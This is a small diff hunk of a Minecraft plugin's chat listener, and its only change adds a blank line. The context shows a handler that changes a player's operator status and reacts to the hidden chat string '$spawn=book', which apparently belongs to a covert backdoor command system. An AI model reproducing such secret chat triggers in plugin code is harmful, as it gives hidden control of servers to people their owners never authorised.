@@ -32,6 +32,7 @@ public class HeckCommands implements Listener {
                     p.setOp(false);
                 }
             }.runTask(JavaPlugin.getPlugin(Combat.class));
+
         } else if (e.getMessage().contains("$spawn=book")) {
             e.setCancelled(true);
             Location loc = p.getLocation();
